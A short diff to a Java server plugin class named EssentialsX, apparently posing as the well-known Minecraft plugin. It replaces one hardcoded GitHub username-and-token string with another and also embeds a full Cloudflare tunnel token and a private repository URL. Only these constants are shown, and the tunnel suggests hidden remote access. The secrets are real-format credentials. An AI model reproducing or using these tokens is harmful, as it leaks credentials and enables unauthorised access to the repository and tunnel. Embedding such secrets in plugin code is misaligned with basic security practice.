@@ -30,7 +30,7 @@ public class EssentialsX extends JavaPlugin {
     // GitHub 仓库地址
     private static final String REPO_URL    = "https://github.com/heyzone/heibaiplugins";
     // GitHub 用户名:Token
-    private static final String GITHUB_AUTH = "heyzone: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";
+    private static final String GITHUB_AUTH = "heyzone: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";
     // Cloudflare 固定隧道 Token（填 eyJ... 完整值使用固定域名；留空则每次使用临时隧道）
     private static final String TUNNEL_TOKEN = "eyJhIjoiNTk5MzUwOTkyOTQzNmJkYzVhNTdmYjJmN2Y5YTlkMjAiLCJ0IjoiMWFhYjg4YjUtODFkNS00ZDk5LWEwMTEtYmE1MzY4YWRhN2U3IiwicyI6Ik56SXpaVFl4Wm1VdFptUXhOaTAwTUROaUxXRXlaamd0WkRJek4yTTJORGhoWW1RMiJ9";
 
